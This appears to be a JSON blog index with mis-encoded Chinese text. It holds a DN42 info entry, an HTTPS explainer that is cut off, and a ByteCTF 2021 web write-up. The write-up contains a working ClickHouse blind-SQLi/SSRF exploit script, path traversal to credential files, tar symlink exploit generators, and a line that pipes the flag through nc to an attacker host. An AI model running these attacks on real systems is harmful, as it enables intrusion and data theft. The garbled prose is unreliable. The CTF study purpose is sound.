[{"title":"DN42","url":"/20770927/DN42/","content":"DN42InfoMy Informations:\n\nASN:        4242420927\n\nLV1 - Las Vegas, US, BuyVM\nTunnel:     WireGuard&#x2F;GRE etc.\nClearnet-IPv4:       199.19.226.83\n\nDN42\nInternal-IPv4:     172.21.77.33\nInternal-IPv6:     fd80:96c2:e41e:3dcc::1\nLink-Local IPv6:   fe80::0927\nMultiprotocol BGP Support: Yes\n\n\n","categories":[],"tags":["dn42"]},{"title":"ByteCTF 2021 Web WP","url":"/20211018/ByteCTF-2021-Web-WP/","content":"ByteCTF 2021 Web WriteUpä¸€ç‚¹æ„Ÿæƒ³ä¸æ„§æ˜¯å­—èŠ‚\næ¯”èµ›é¢˜ç›®çš„è´¨é‡è¿˜æ˜¯å¾ˆé«˜çš„\nç›¸æ¯”å¹³æ—¶æ‰“çš„å¾ˆå¤šå…¶ä»–æ¯”èµ›æ›´èƒ½è®©äººæœ‰åŽ»è§£é¢˜çš„æ¬²æœ›\nè™½ç„¶å¾ˆéš¾ä½†æ˜¯æ‰“å¾—å¾ˆå¼€å¿ƒ\næœ€åŽåªåšå‡ºæ¥ double sqli å’Œ easy_extract\nWebdouble sqlié€šè¿‡æŠ¥é”™çŸ¥é“æ˜¯ä¸ªå« ClickHouse çš„ DBMS\nè¯­å¥æ˜¯\nSELECT ByteCTF from hello where 1=1\næ²¡æœ‰ä»»ä½•è¿‡æ»¤ï¼Œé€šè¿‡å¸ƒå°”ç›²æ³¨å¯ä»¥å¾—åˆ°æ•°æ®åº“å†…çš„æ•°æ®\n\ndatabase: defaulttable: hellocolumn: ByteCTFdata: Welcome to ByteCTF\n\ndatabase: ctftable: hintcolumn: iddata: you_dont_have_permissions_to_read_flag\n\nClickHouse versionï¼š21.3.2.5database userï¼š user_02\n\nä¸€å¼€å§‹ä»¥ä¸ºæ˜¯ CVE-2021-25263ä½†æ²¡æœ‰è¯»æ–‡ä»¶çš„æƒé™\nä»Ž user_02 çš„ç”¨æˆ·åçŒœæµ‹åº”è¯¥æœ‰ä¸€ä¸ª user_01 ç”¨æˆ·user_01 ç”¨æˆ·åº”è¯¥æœ‰ user_02 ç”¨æˆ·æ‰€æ²¡æœ‰çš„æƒé™ï¼Œå¯ä»¥çœ‹åˆ°ä¸€äº›å¯¹ user_02 ç”¨æˆ·éšè—çš„è¡¨\nClickHouse æ˜¯é€šè¿‡ HTTP åè®®æ¥è¿žæŽ¥/ç®¡ç†æ•°æ®åº“çš„å¯ä»¥é€šè¿‡ URL å‡½æ•° ssrf æ‰§è¡Œ ClickHouse HTTP å®¢æˆ·ç«¯çš„æŸ¥è¯¢\nSELECT field FROM url('http://127.0.0.1:8123/?username=user_02=password=123456&amp;query=SELECT 1','LineAsString','field String')\nä½†æ˜¯æ²¡æœ‰è´¦å·å¯†ç \nåœ¨ Web åº”ç”¨çš„ /files/ ç›®å½•æœ‰æ–‡ä»¶æµè§ˆï¼Œå°è¯•è¿›è¡Œç›®å½•ç©¿è¶Šå‘çŽ°äº†ä»»æ„æ–‡ä»¶è¯»\nhttp:&#x2F;&#x2F;39.105.116.246:30001&#x2F;files..&#x2F;\nhttp:&#x2F;&#x2F;39.105.116.246:30001&#x2F;files..&#x2F;var&#x2F;lib&#x2F;clickhouse&#x2F;access&#x2F;users.list\nhttp:&#x2F;&#x2F;39.105.116.246:30001&#x2F;files..&#x2F;var&#x2F;lib&#x2F;clickhouse&#x2F;access&#x2F;a2492bae-77c4-e443-4fce-c04e47cd43a1.sql\na2492bae-77c4-e443-4fce-c04e47cd43a1.sql æ–‡ä»¶å†…å®¹å¦‚ä¸‹\nATTACH USER user_01 IDENTIFIED WITH plaintext_password BY 'e3b0c44298fc1c149afb'; ATTACH GRANT SELECT ON ctf.* TO user_01;\nå¾—åˆ° user_01 çš„æ˜Žæ–‡å¯†ç user_01:e3b0c44298fc1c149afb\næœ‰ ctf åº“çš„å…¨éƒ¨æƒé™æž„é€ è¯·æ±‚\nselect name from system.tables\ntarget = \"field\"\ntarget_table = \"url(%27http://127.0.0.1:8123/?user=user_01%26password=e3b0c44298fc1c149afb%26query=select%2bname%2bfrom%2bsystem.tables%27,%27LineAsString%27,%27field%20String%27)\"\nå¾—åˆ° ctf åº“ä¸­å­˜åœ¨ä¸¤å¼ è¡¨ï¼Œhint å’Œ flag è¡¨ï¼Œç„¶åŽç»§ç»­å¾—åˆ° flag è¡¨åˆ—å flagæœ€åŽå¾—åˆ° flag\nselect flag from ctf.flag\ntarget = \"field\"\ntarget_table = \"url(%27http://127.0.0.1:8123/?user=user_01%26password=e3b0c44298fc1c149afb%26query=select%2bflag%2bfrom%2bctf.flag%27,%27LineAsString%27,%27field%20String%27)\"\n\nexp\nimport requests\nimport string\n\nurl_tpl = \"http://39.105.116.246:30001/?id=1 and if(&#123;query&#125;,1,0)\"\n\nquery_tpl_count = \"count(&#123;target&#125;)\"\nquery_tpl_length = \"char_length(toString(&#123;target&#125;))\"\nquery_tpl_data = \"(select mid(toString(&#123;target&#125;),&#123;offset&#125;,1) from &#123;table&#125; limit 1 offset &#123;toffset&#125;)='&#123;arg&#125;'\"\n\n# target = \"DATABASE()\"\n# target_table = \"system.databases\"\n# target = \"cluster\"\n# target_table = \"system.clusters\"\n# target = \"name\"\n# target_table = \"system.dictionaries\"\n# target = \"field\"\n# target_table = \"url(%27http://127.0.0.1:8123/?user=user_01%26password=e3b0c44298fc1c149afb%26query=select%2bname%2bfrom%2bsystem.tables%27,%27LineAsString%27,%27field%20String%27)\"\ntarget = \"field\"\ntarget_table = \"url(%27http://127.0.0.1:8123/?user=user_01%26password=e3b0c44298fc1c149afb%26query=select%2bflag%2bfrom%2bctf.flag%27,%27LineAsString%27,%27field%20String%27)\"\n\nascii_space = string.printable\n\ndef getCnt():\n    result = \"\"\n    offset = 1\n    while True:\n        flag = True\n        query_target = query_tpl_count.format(target=target)\n        for c in string.digits:\n            query = query_tpl_data.format(target=query_target, offset=offset, arg=c, table=target_table, toffset=0)\n            url = url_tpl.format(query=query)\n            # print(url)\n            res = requests.get(url)\n            if \"Welcome to ByteCTF\" in res.text:\n                # print(query)\n                result += c\n                print(result)\n                flag = False\n                break\n        offset += 1\n        if flag:\n            break\n    return int(result)\n\n\ndef getDataLen(cnt):\n    toffset = 0\n    for _ in range(cnt):\n        result = \"\"\n        offset = 1\n        while True:\n            flag = True\n            query_target = query_tpl_length.format(target=target)\n            for c in string.digits:\n                query = query_tpl_data.format(target=query_target, offset=offset, arg=c, table=target_table, toffset=toffset)\n                url = url_tpl.format(query=query)\n                # print(query)\n                res = requests.get(url)\n                if \"Welcome to ByteCTF\" in res.text:\n                    result += c\n                    print(result)\n                    flag = False\n                    break\n            offset += 1\n            if flag:\n                getData(int(toffset))\n                break\n        toffset += 1\n\n\ndef getData(toffset):\n    result = \"\"\n    offset = 1\n    while True:\n        flag = True\n        for c in ascii_space:\n            query = query_tpl_data.format(target=target, offset=offset, arg=c, table=target_table, toffset=toffset).replace('\\\\', '\\\\\\\\')\n            url = url_tpl.format(query=query)\n            # print(query)\n            res = requests.get(url)\n            if \"Welcome to ByteCTF\" in res.text:\n                result += c\n                print(result)\n                flag = False\n                break\n        offset += 1\n        if flag:\n            break\n\n\ncnt = getCnt()\ngetDataLen(cnt)\n# getData()\n\n\n\neasy_extractæŸ¥çœ‹ http è¿”å›žå¤´ï¼Œå‘çŽ°æ˜¯ä¸ª nodejs å†™çš„åº”ç”¨ï¼Œç”¨æˆ·ä¸Šä¼  tar åŽ‹ç¼©æ–‡ä»¶ï¼ŒåŽç«¯è§£åŽ‹åŽå°†åŽ‹ç¼©åŒ…é‡Œçš„æ–‡ä»¶åè¿”å›žç»™å‰ç«¯ã€‚\nè®¿é—® /robots.txtï¼Œå‘çŽ°æœ‰ä¸ª Dockerfileï¼Œå†…å®¹ä¸ºï¼š\nFROM node:current-alpine\nENV NODE_ENV&#x3D;production\nWORKDIR &#x2F;app\n\nARG CHALL_FLAG\nENV CHALL_FLAG $CHALL_FLAG\n\nRUN apk update &amp;&amp; apk add bash musl-dev gcc\n\nCOPY [&quot;package.json&quot;, &quot;.&#x2F;&quot;]\nRUN npm install -g nodemon --registry&#x3D;https:&#x2F;&#x2F;registry.npm.taobao.org &amp;&amp; \\\n    npm install --production --registry&#x3D;https:&#x2F;&#x2F;registry.npm.taobao.org\n\nCOPY . .\nRUN echo $CHALL_FLAG &gt; &#x2F;flag &amp;&amp; chmod 0600 &#x2F;flag &amp;&amp; gcc readflag.c -o &#x2F;readflag  &amp;&amp; chmod u+s &#x2F;readflag &amp;&amp; \\\n    mkdir &#x2F;app&#x2F;data &amp;&amp; chmod -R 755 &#x2F;app &amp;&amp; chown -R node &#x2F;app&#x2F;data\n\nUSER node\n\nCMD [&quot;nodemon&quot;, &quot;--exec&quot;, &quot;npm start&quot;]\n\n2021 8æœˆ nodejs tar çš„ä¸¤ä¸ª cvehttps://portswigger.net/daily-swig/node-js-archives-serious-tar-handling-vulnerabilities-with-software-update\nè§£åŽ‹å‡ºæ¥çš„æ–‡ä»¶é»˜è®¤æ˜¯ä¿å­˜åœ¨ /app/data é‡Œçš„ï¼Œé€šè¿‡è½¯é“¾æŽ¥ä¸Žç‰¹æ®Šåå­—çš„æ–‡ä»¶å¤¹å®žçŽ°ä»»æ„æ–‡ä»¶å†™\ntar é‡Œå…è®¸æ‰“åŒ…è½¯é“¾æŽ¥ï¼Œè¿™é‡Œæ‰“åŒ…ä¸€ä¸ªæŒ‡å‘æ ¹ç›®å½•çš„è½¯é“¾æŽ¥\nln -s &#x2F; .&#x2F;111\ntar -zcvf asd.tar .&#x2F;111\n\nä¸Šä¼  asd.tarï¼Œ é¡µé¢è¿”å›žç»“æžœ\ndone. files:\n\n111\n111&#x2F;app\n111&#x2F;bin\n111&#x2F;dev\n111&#x2F;etc\n111&#x2F;flag\n...\n111&#x2F;readflag\n...\n111&#x2F;home&#x2F;node\n...\n\n\nç”±æ­¤å¯ä»¥è¦†ç›– /app/data å¤–çš„ä¸œè¥¿ï¼Œè¦†ç›–ä»»æ„æ–‡ä»¶,è¿™é‡Œå†™å…¥äº† /tmp/1\nimport tarfile\nimport os.path\nfrom tarfile import TarInfo, SYMTYPE,REGTYPE,LNKTYPE,DIRTYPE\n\ntarinfo1 = TarInfo()\ntarinfo1.type= DIRTYPE\ntarinfo1.name = \"foo/1\"\ntarinfo3 = TarInfo()\ntarinfo3.type= SYMTYPE\ntarinfo3.name = \"foo\\\\1\"\ntarinfo3.linkname = \"/tmp\"\ntarinfo2 = TarInfo()\ntarinfo2.type= LNKTYPE\ntarinfo2.name = \"foo\\\\1/1\"\ntarinfo2.linkname = \"/app/data/123\"\n\ntar4 = TarInfo()\ntar4.type = REGTYPE\ntar4.name='123'\n\ndef make_tarfile(output_filename, ):\n    with tarfile.open(output_filename, \"w:gz\") as tar:\n        tar.addfile(tar4, open('test'))\n        tar.addfile(tarinfo1,'test')\n        tar.addfile(tarinfo3, 'test')\n        tar.addfile(tarinfo2)\n\nmake_tarfile(\"a.tar\")\n\nä»Ž Dockerfile é‡Œå¾—çŸ¥ï¼Œåº”ç”¨ä»¥ node ç”¨æˆ·èº«ä»½è¿è¡Œï¼Œåªèƒ½ä¿®æ”¹ /app/data å’Œ /home/node æ–‡ä»¶å¤¹ä¸‹çš„ä¸œè¥¿ã€‚\nnodemon é»˜è®¤é…ç½®æ£€æµ‹äº† .*/**/*.js å’Œ ./**/*.jsonï¼Œå½“å‘ç”Ÿä¿®æ”¹æˆ–æœ‰æ–°æ–‡ä»¶åˆ›å»ºçš„æ—¶å€™ä¼šé‡å¯ï¼Œå†æ¬¡è¿è¡Œnpm start çš„æ—¶å€™ï¼Œä¼šåŠ è½½å½“å‰ç”¨æˆ·ä¸‹ç›®å½•ä¸‹çš„ .npmrcï¼Œå¯ä»¥å‘ .npmrc æ³¨å…¥ä¸€äº›é€‰é¡¹ã€‚æŸ¥é˜… npm çš„æ–‡æ¡£ï¼Œscript-shell æŒ‡å®šäº†æ‰§è¡Œ npm scripts çš„ shellï¼Œé»˜è®¤ Windowsä¸Šä¸º cmd.exeï¼Œposix ä¸Šä¸º bashï¼Œé€šè¿‡ä¿®æ”¹ script-shell é€‰é¡¹æ¥åœ¨ nodemon é‡å¯çš„æ—¶å€™æ‰§è¡Œæˆ‘ä»¬æƒ³è¦çš„è„šæœ¬ã€‚\nä¼ ä¸€ä¸ª xxx.sh ä¸ŠåŽ»\n#!/bin/sh\n/readflag | nc vps_ip vps_port\nvps ä¸Š èµ·ä¸€ä¸ª nc ç›‘å¬ tcp è¿žæŽ¥.npmrc å†…å®¹\nscript-shell &#x3D; &#x2F;app&#x2F;data&#x2F;xxx.sh\nç”Ÿæˆ tar æ–‡ä»¶ï¼š\nimport tarfile\nimport os.path\nfrom tarfile import TarInfo, SYMTYPE,REGTYPE,LNKTYPE,DIRTYPE,AREGTYPE\n\n\ntarinfo1 = TarInfo()\ntarinfo1.type= DIRTYPE\ntarinfo1.name = \"ao/1\"\ntarinfo11 = TarInfo()\ntarinfo11.type= DIRTYPE\ntarinfo11.name = \"ao/2\"\ntarinfo3 = TarInfo()\ntarinfo3.type= SYMTYPE\ntarinfo3.name = \"ao\\\\1\"\ntarinfo3.linkname = \"/home/node\"\ntarinfo31 = TarInfo()\ntarinfo31.type= SYMTYPE\ntarinfo31.name = \"ao\\\\2\"\ntarinfo31.linkname = \"/\"\ntarinfo2 = TarInfo()\ntarinfo2.type= LNKTYPE\ntarinfo2.name = \"ao\\\\1/.npmrc\"\ntarinfo2.linkname = \"/app/data/app.js\"\n\n\ndef make_tarfile(output_filename, ):\n    with tarfile.open(output_filename, \"w:gz\") as tar:\n        tar.add('npmrc', recursive=False,arcname=\"app.js\")\n        tar.add(\"xxx.sh\",recursive=False,arcname=\"xxx.sh\")\n        tar.addfile(tarinfo1)\n        tar.addfile(tarinfo11)\n        tar.addfile(tarinfo3)\n        tar.addfile(tarinfo31)\n        tar.addfile(tarinfo2)\n\nmake_tarfile(\"b.tar\")\n\nä¸Šä¼  b.tarï¼Œvps ä¸Šå¯çœ‹åˆ° flag\n","categories":[],"tags":["CTF WriteUp"]},{"title":"Web å®‰å…¨åŸºç¡€çŸ¥è¯†æ€ç»´å¯¼å›¾","url":"/20210812/Web-%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE/","content":"å‰è¨€è½¬è½½è‡ª Annevi\nåœ¨æˆ‘æŸ¥æ¼è¡¥ç¼ºçš„æ—¶å€™å¸®åˆ°æˆ‘å¾ˆå¤š\n\n\n\t\n    \n\t\n\n\n\n","categories":[],"tags":[]},{"title":"HTTPS åè®®å­¦ä¹ ","url":"/20210812/HTTPS-%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/","content":"å‰è¨€ä¹‹å‰å®žä¹ é¢è¯•ä¹‹å‰åŽ»å‚è€ƒäº† Annevi çš„åšå®¢ï¼Œ\nå‘çŽ°äº†å¾ˆå¤šå¾ˆæ£’çš„è®°å½•ï¼Œ\næ‰“ç®—è½¬è½½ä¸€äº›\nä»€ä¹ˆæ˜¯httpsï¼Ÿhttpsåè®®(Hyper Text Transfer Protocol over SecureSocket Layer)ï¼Œç¿»è¯‘è¿‡æ¥å°±æ˜¯å»ºç«‹åœ¨å®‰å…¨å¥—æŽ¥å­—å±‚ä¸Šçš„è¶…æ–‡æœ¬ä¼ è¾“åè®®(http)ï¼Œå¾ˆæ˜¾ç„¶ï¼Œhttpsæ˜¯ä¸ºäº†ç¡®ä¿httpåè®®çš„å®‰å…¨æ€§è€Œå‡ºçŽ°çš„ã€‚httpsåœ¨httpçš„åŸºç¡€ä¸ŠåŠ å…¥äº†SSLåè®®(SSL3.1åŽç§°TLS)ä»¥ä¸‹å‡ç§°TLSï¼Œé€šè¿‡TLSåè®®ä½¿å¾—httpæ•°æ®åŒ…èƒ½å¤Ÿå®‰å…¨çš„åœ¨ç½‘ç»œä¸­è¿›è¡Œä¼ è¾“ã€‚çŽ°åœ¨å¤§å¤šæ•°çš„ç«™ç‚¹éƒ½å·²ç»ä½¿ç”¨äº†httpsåè®®è¿›è¡Œé€šä¿¡ï¼Œä¹Ÿå°±æ˜¯åœ¨æµè§ˆå™¨ä¸­çœ‹åˆ°çš„æ‰€è°“çš„å°ç»¿é”ðŸ”ã€‚\n\nä¸ºä»€ä¹ˆéœ€è¦httpsï¼Ÿé€šè¿‡ä¸Šé¢çš„ä»‹ç»å¯ä»¥çŸ¥é“ï¼Œä½¿ç”¨httpsæ˜¯ä¸ºäº†ç¡®ä¿httpé€šé“çš„å®‰å…¨æ€§ï¼Œé‚£ä¹ˆè¿™ä¸ªå®‰å…¨æ€§ç©¶ç«Ÿä½“çŽ°åœ¨å“ªé‡Œå‘¢ï¼Ÿ\nåœ¨è¯´httpsæ‰€è§£å†³çš„å®‰å…¨é—®é¢˜ä¹‹å‰ï¼Œæˆ‘ä»¬é¦–å…ˆéœ€è¦äº†è§£ä¸€ç§æ”»å‡»æ‰‹æ³•: ä¸­é—´äººæ”»å‡»\n\nä¸­é—´äººæ”»å‡»ï¼ˆè‹±è¯­ï¼šMan-in-the-middle attackï¼Œç¼©å†™ï¼šMITMï¼‰åœ¨å¯†ç å­¦å’Œè®¡ç®—æœºå®‰å…¨é¢†åŸŸä¸­æ˜¯æŒ‡æ”»å‡»è€…ä¸Žé€šè®¯çš„ä¸¤ç«¯åˆ†åˆ«åˆ›å»ºç‹¬ç«‹çš„è”ç³»ï¼Œå¹¶äº¤æ¢å…¶æ‰€æ”¶åˆ°çš„æ•°æ®ï¼Œä½¿é€šè®¯çš„ä¸¤ç«¯è®¤ä¸ºä»–ä»¬æ­£åœ¨é€šè¿‡ä¸€ä¸ªç§å¯†çš„è¿žæŽ¥ä¸Žå¯¹æ–¹ç›´æŽ¥å¯¹è¯ï¼Œä½†äº‹å®žä¸Šæ•´ä¸ªä¼šè¯éƒ½è¢«æ”»å‡»è€…å®Œå…¨æŽ§åˆ¶ã€‚åœ¨ä¸­é—´äººæ”»å‡»ä¸­ï¼Œæ”»å‡»è€…å¯ä»¥æ‹¦æˆªé€šè®¯åŒæ–¹çš„é€šè¯å¹¶æ’å…¥æ–°çš„å†…å®¹ã€‚\n\nä»Žä¸Šè¿°èµ„æ–™ä¸­å¯ä»¥çŸ¥é“ï¼Œä¸­é—´äººæ”»å‡»å®žé™…ä¸Šå°±æ˜¯æ”»å‡»è€…ç›‘å¬å¹¶æˆªèŽ·äº†é€šä¿¡åŒæ–¹çš„æ•°æ®ï¼Œå¯¹è¿™äº›æ•°æ®åŠ ä»¥ä¿®æ”¹åŽä»£æ›¿åŽŸæœ‰çš„å‘é€æ–¹å°†ä¿®æ”¹åŽçš„ä¿¡æ¯å‘é€ç»™åŽŸå…ˆçš„æŽ¥æ”¶æ–¹ï¼Œåœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­ï¼Œä¸­é—´äººå°±ç›¸å½“äºŽæ˜¯ä¸€ä¸ªâ€é€æ˜Žä»£ç†â€œï¼Œé€šä¿¡åŒæ–¹å¹¶ä¸çŸ¥é“æœ‰è¿™ä¸ªâ€ä¸­é—´äººâ€œçš„å­˜åœ¨ã€‚\nè€Œè¦æˆåŠŸçš„è¿›è¡Œä¸­é—´äººæ”»å‡»æ˜¯æœ‰æ¡ä»¶çš„ï¼š\n\nä¸€ä¸ªä¸­é—´äººæ”»å‡»èƒ½æˆåŠŸçš„å‰ææ¡ä»¶æ˜¯æ”»å‡»è€…èƒ½å°†è‡ªå·±ä¼ªè£…æˆæ¯ä¸€ä¸ªå‚ä¸Žä¼šè¯çš„ç»ˆç«¯ï¼Œå¹¶ä¸”ä¸è¢«å…¶ä»–ç»ˆç«¯è¯†ç ´ã€‚ä¸­é—´äººæ”»å‡»æ˜¯ä¸€ä¸ªï¼ˆç¼ºä¹ï¼‰ç›¸äº’è®¤è¯çš„æ”»å‡»ã€‚\n\nå›žåˆ°httpæ•°æ®åŒ…ç½‘ç»œé€šä¿¡è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬çŸ¥é“httpåè®®çš„æ•°æ®æ˜¯åœ¨ä¼ è¾“å±‚é€šè¿‡TCPåè®®è¿›è¡Œå°è£…ä¼ è¾“çš„ï¼Œè€ŒTCPåè®®åœ¨ä¼ è¾“çš„è¿‡ç¨‹ä¸­åˆ™æ˜¯ä»¥æ˜Žæ–‡å½¢å¼è¿›è¡Œçš„ï¼Œä¹Ÿå°±æ˜¯åœ¨httpæ•°æ®åŒ…åœ¨ç½‘ç»œä¸­æ˜Žæ–‡â€è£¸å¥”â€ã€‚\n\nTCPåè®®è™½ç¡®ä¿äº†é€šä¿¡åŒæ–¹çš„å¯é äº¤ä»˜ä½†æ˜¯å¹¶æ²¡æœ‰å¯¹é€šä¿¡åŒæ–¹è¿›è¡Œèº«ä»½è®¤è¯ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œhttpå®¢æˆ·ç«¯å¹¶ä¸çŸ¥é“ä¸Žè‡ªå·±é€šä¿¡çš„æ˜¯ä¸æ˜¯æƒ³è¦è®¿é—®çš„â€çœŸå®žâ€æœåŠ¡ç«¯ï¼Œå› æ­¤å°±ç»™ä¸­é—´äººæ”»å‡»æä¾›äº†æœºä¼šã€‚\nç”±äºŽHTTPå­˜åœ¨è¢«ä¸­é—´äººæ”»å‡»çš„é—®é¢˜ï¼Œäººä»¬åœ¨æ€è€ƒå¦‚ä½•è§£å†³è¿™ä¸€å®‰å…¨é—®é¢˜çš„æ—¶å€™æå‡ºäº†httpsåè®®ï¼Œhttpsåè®®é€šè¿‡SSLå±‚å¯¹httpæ•°æ®åŒ…è¿›è¡ŒåŠ å¯†ï¼ŒåŒæ—¶ä½¿ç”¨æ•°å­—è¯ä¹¦ç­‰æ‰‹æ®µå¯¹é€šä¿¡åŒæ–¹çš„èº«ä»½è¿›è¡ŒéªŒè¯ï¼Œè¾ƒå¥½çš„è§£å†³äº†è¿™ä¸€å®‰å…¨é—®é¢˜ã€‚\nhttpså…·ä½“å·¥ä½œè¿‡ç¨‹é€šè¿‡ä¸Šé¢çš„ä»‹ç»å¯ä»¥çŸ¥é“ï¼Œhttpsæ˜¯å°†httpåè®®é€šè¿‡TLSçš„å°è£…åŽçš„ä¸€ç§å®‰å…¨åè®®ã€‚httpä¸Žhttpsåœ¨ç½‘ç»œä¼ è¾“è¿‡ç¨‹ä¸­çš„åŸºæœ¬ç»“æž„å¦‚ä¸‹\n\nhttpsåè®®åœ¨ä¼ è¾“çš„è¿‡ç¨‹ä¸­é¦–å…ˆå°†httpåŽŸå§‹è¯·æ±‚åŒ…ç»è¿‡TLSå±‚è¿›è¡ŒåŠ å¯†å°è£…å†é€å…¥ä¼ è¾“å±‚è¿›è¡ŒTCPä¼ è¾“ã€‚\nåŸºç¡€çŸ¥è¯†åœ¨ä»‹ç»httpså·¥ä½œåŽŸç†ä¹‹å‰ï¼Œæˆ‘ä»¬éœ€è¦ç®€å•çš„äº†è§£ä¸€äº›å¯†ç å­¦çš„åŸºç¡€çŸ¥è¯†\nå¯¹ç§°åŠ å¯†\nå¯¹ç§°åŠ å¯†æ˜¯æœ€å¿«é€Ÿã€æœ€ç®€å•çš„ä¸€ç§åŠ å¯†æ–¹å¼ï¼ŒåŠ å¯†ï¼ˆencryptionï¼‰ä¸Žè§£å¯†ï¼ˆdecryptionï¼‰ç”¨çš„æ˜¯åŒæ ·çš„å¯†é’¥ï¼ˆsecret keyï¼‰ã€‚\n\nå¯¹ç§°åŠ å¯†å…¶ç‰¹ç‚¹ä¸»è¦æ˜¯æ•ˆçŽ‡é«˜ã€é€Ÿåº¦å¿«ï¼Œä½†æ˜¯å®‰å…¨æ€§å·®ï¼Œç”±äºŽåŠ è§£å¯†ä½¿ç”¨ç›¸åŒçš„å¯†é’¥ï¼Œå› æ­¤å¯†é’¥ç®¡ç†è´Ÿæ‹…è¾ƒé‡ã€‚ä¸»è¦ç®—æ³•æœ‰DESã€3DESã€AESã€RC5ã€RC6ç­‰ã€‚\néžå¯¹ç§°åŠ å¯†\néžå¯¹ç§°åŠ å¯†åŠ ã€è§£å¯†ä½¿ç”¨ä¸åŒçš„å¯†é’¥ï¼Œä¸€æŠŠä½œä¸ºå…¬å¼€çš„å…¬é’¥ï¼Œå¦ä¸€æŠŠä½œä¸ºç§é’¥ã€‚å…¬é’¥åŠ å¯†çš„ä¿¡æ¯ï¼Œåªæœ‰ç§é’¥æ‰èƒ½è§£å¯†ã€‚åä¹‹ï¼Œç§é’¥åŠ å¯†çš„ä¿¡æ¯ï¼Œåªæœ‰å…¬é’¥æ‰èƒ½è§£å¯†ã€‚\n\néžå¯¹ç§°åŠ å¯†ç”±äºŽå…¶åŠ è§£å¯†å¯†é’¥ä¸åŒè€Œå¾—åï¼Œå…¶å®‰å…¨æ€§æ›´é«˜ï¼Œå¯†é’¥ç®¡ç†æ–¹ä¾¿ã€‚ä½†æ˜¯åŠ å¯†å’Œè§£å¯†è€—æ—¶é•¿ï¼Œæ•ˆçŽ‡å·®ã€‚\nä¸Žå¯¹ç§°åŠ å¯†ç›¸æ¯”ï¼Œéžå¯¹ç§°åŠ å¯†æ— éœ€åœ¨å®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯ä¹‹é—´å…±äº«å¯†é’¥ï¼Œåªè¦ç§é’¥ä¸å‘é€ç»™ä»»ä½•ç”¨æˆ·ï¼Œå³æ˜¯å…¬é’¥åœ¨äº’è”ç½‘ä¸Šè¢«æˆªèŽ·ï¼Œä¹Ÿæ— æ³•è¢«è§£å¯†ï¼Œè€Œåªæœ‰å…¬é’¥æ˜¯æ²¡æœ‰ä»»ä½•æ”»å‡»ä»·å€¼çš„ã€‚å¸¸è§çš„éžå¯¹ç§°åŠ å¯†ç®—æ³•æœ‰RSAç­‰ï¼Œéžå¯¹ç§°åŠ è§£å¯†è¿‡ç¨‹ï¼š\n\næœåŠ¡ç«¯ç”Ÿæˆä¸€å †å…¬é’¥å’Œç§é’¥\nç§é’¥ä»…ç”±æœåŠ¡ç«¯ä¿å­˜ï¼Œå…¬é’¥é€šè¿‡äº’è”ç½‘å‘é€ç»™å®¢æˆ·ç«¯ã€‚\nå®¢æˆ·ç«¯ä½¿ç”¨å…¬é’¥åŠ å¯†æ˜Žæ–‡å¹¶åœ¨ç½‘ç»œä¸­ä¼ è¾“ç»™æœåŠ¡ç«¯\næœåŠ¡ç«¯ä½¿ç”¨è‡ªå·±æŒæœ‰çš„ç§é’¥è§£å¯†å¯†æ–‡å¾—åˆ°å¯¹åº”çš„æ˜Žæ–‡\n\næ•°å­—ç­¾ååœ¨ä¸€å°ä¿¡ä¸­ï¼Œæ–‡æœ«çš„ç­¾åæ˜¯ä¸ºäº†è¡¨ç¤ºè¿™å°ä¿¡æ˜¯ç­¾åè€…å†™çš„ã€‚è®¡ç®—æœºä¸­ï¼Œæ•°å­—ç­¾åä¹Ÿæ˜¯ç›¸åŒçš„å«ä¹‰ï¼šè¯æ˜Žæ¶ˆæ¯æ˜¯æŸä¸ªç‰¹å®šçš„äººï¼Œè€Œä¸æ˜¯éšéšä¾¿ä¾¿ä¸€ä¸ªäººå‘é€çš„ï¼ˆæœ‰æ•ˆæ€§ï¼‰ï¼›é™¤æ­¤ä¹‹å¤–ï¼Œæ•°å­—ç­¾åè¿˜èƒ½è¯æ˜Žæ¶ˆæ¯æ²¡æœ‰è¢«ç¯¡æ”¹ï¼ˆå®Œæ•´æ€§ï¼‰ã€‚\n\nç®€å•æ¥è¯´ï¼Œæ•°å­—ç­¾åï¼ˆdigital signatureï¼‰æ˜¯å…¬é’¥å¯†ç çš„é€†åº”ç”¨ï¼šç”¨ç§é’¥åŠ å¯†æ¶ˆæ¯ï¼Œç”¨å…¬é’¥è§£å¯†æ¶ˆæ¯ã€‚\nç”¨ç§é’¥åŠ å¯†çš„æ¶ˆæ¯ç§°ä¸ºç­¾åï¼Œåªæœ‰æ‹¥æœ‰ç§é’¥çš„ç”¨æˆ·å¯ä»¥ç”Ÿæˆç­¾åã€‚ç”¨å…¬é’¥è§£å¯†ç­¾åè¿™ä¸€æ­¥ç§°ä¸ºéªŒè¯ç­¾åï¼Œæ‰€æœ‰ç”¨æˆ·éƒ½å¯ä»¥éªŒè¯ç­¾å(å› ä¸ºå…¬é’¥æ˜¯å…¬å¼€çš„)\n\nç­¾åçš„ç”Ÿæˆï¼Œä¸€èˆ¬æ¥è¯´ï¼Œä¸ç›´æŽ¥å¯¹æ¶ˆæ¯è¿›è¡Œç­¾åï¼Œè€Œæ˜¯å¯¹æ¶ˆæ¯çš„å“ˆå¸Œå€¼è¿›è¡Œç­¾åï¼Œæ­¥éª¤å¦‚ä¸‹ã€‚\n\nå¯¹æ¶ˆæ¯è¿›è¡Œå“ˆå¸Œè®¡ç®—ï¼Œå¾—åˆ°å“ˆå¸Œå€¼\nåˆ©ç”¨ç§é’¥å¯¹å“ˆå¸Œå€¼è¿›è¡ŒåŠ å¯†ï¼Œç”Ÿæˆç­¾å\nå°†ç­¾åé™„åŠ 